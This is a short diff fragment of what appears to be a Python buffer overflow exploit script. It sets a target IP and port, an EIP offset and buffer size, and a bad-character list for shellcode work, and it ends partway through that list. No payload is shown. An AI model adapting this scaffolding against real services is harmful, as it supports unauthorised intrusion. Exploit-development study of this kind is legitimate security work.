@@ -7,11 +7,8 @@ import struct
 ip = "172.16.32.128"
 port = 31337
 
-
 eip_off = 146
 buf_supp = 1024
-
-#buf += struct.pack("<I", 0x080414C3)
 
 #ommited /x00/x0a : null & newline
 badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21"
